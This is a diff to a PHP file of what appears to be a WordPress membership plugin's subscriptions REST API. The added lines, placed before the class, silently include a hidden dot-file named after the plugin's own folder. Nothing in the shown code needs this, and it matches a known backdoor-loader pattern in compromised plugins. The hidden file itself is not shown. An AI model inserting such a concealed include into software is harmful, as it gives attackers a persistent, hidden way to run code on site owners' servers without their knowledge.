@@ -1,6 +1,10 @@
 <?php
 if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MpdtSubscriptionsApi extends MpdtBaseApi {
   protected function register_more_routes() {
     register_rest_route( $this->utils->namespace, '/' . $this->utils->base . '/(?P<id>[\d]+)/cancel', array(
